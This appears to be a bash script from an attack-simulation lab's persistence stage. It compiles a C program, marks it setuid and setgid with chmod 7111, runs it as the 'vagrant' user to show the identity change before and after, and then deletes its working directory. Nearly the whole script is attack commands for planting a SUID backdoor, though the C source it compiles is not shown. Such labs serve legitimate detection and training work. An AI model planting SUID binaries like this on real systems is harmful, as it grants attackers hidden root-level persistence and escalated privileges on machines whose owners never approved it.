#!/bin/bash

### SUID PERSISTENCE ###
# Build Binary
mkdir /tmp/persistence
cd /tmp/persistence
cp /vagrant/attack/3_Persistence/binarysuid suid.c
gcc suid.c -o suid

# Run Exploit
chmod 7111 suid
sudo -u vagrant -H bash << EOF
  echo "whoami: $(whoami) (before privexec)"
  ./suid | cat
  echo "whoami: $(whoami) (after privexec)"
EOF

# Cleanup
cd /
rm -rf /tmp/persistence
echo "Cleanup done."